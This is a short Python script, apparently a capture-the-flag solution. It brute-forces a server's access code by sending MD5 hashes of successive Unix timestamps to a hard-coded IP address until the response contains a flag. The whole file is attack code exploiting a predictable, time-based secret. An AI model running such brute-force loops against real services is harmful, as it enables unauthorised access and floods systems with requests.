import time
import requests
import hashlib

for i in range(1628168161, 1630182253):
    print(i)
    timestamp = str(int(i))
    code = hashlib.md5(timestamp.encode()).hexdigest()
    data = {"code": code}
    r = requests.post("http://35.246.178.49:30980/", data=data)
    if "ctf" in r.content or "CTF" in r.content:
        print(r.content)
        exit(0)